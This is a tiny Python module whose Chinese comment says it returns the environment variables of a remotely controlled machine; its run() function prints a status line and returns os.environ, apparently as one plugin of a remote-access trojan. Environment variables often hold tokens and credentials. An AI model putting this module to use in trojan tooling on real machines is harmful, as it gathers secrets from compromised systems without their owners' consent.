# -*- coding:utf8 -*-
# 返回当前系统的环境变量，这里就是远程被控机器的环境变量
import os


def run(**args):
    print("[*] In environment module.")

    return str(os.environ)
